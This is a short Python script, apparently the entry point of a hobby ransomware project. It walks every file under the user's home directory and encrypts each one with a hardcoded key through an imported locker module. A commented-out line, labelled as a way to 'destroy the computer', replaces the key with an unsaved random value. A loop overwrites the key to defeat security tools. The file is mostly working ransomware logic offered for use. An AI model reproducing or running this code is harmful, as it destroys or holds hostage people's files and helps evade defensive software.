import os
import base64
from locker import locker
from walker import walker


def main():
    """
    This function is self explainable. And yes, DO NOT use it if
    you seriously don't know what's going on. Still, it won't be a
    prooblem, because, you already know the *hardcoded_key*
    """

    hardcoded_key = b"no please, don't see this"

    ###########################################################################
    # Uncomment this line of code below if you want to destroy the computer,
    # but please don't blame me, as I warned you before... :)

    # hardcoded_key = base64.b64encode(os.urandom(32))
    ###########################################################################

    path = os.path.expanduser('~')

    targets = walker(path)
    for target in targets:
        try:
            locker(target, hardcoded_key)
        except (FileNotFoundError, IsADirectoryError):
            pass
    
    # Remove the hardcoded key from memory to
    # prevent any security apps to extract it.
    for _ in range(128):
        hardcoded_key = os.urandom(32)

if __name__ == '__main__':
    main()
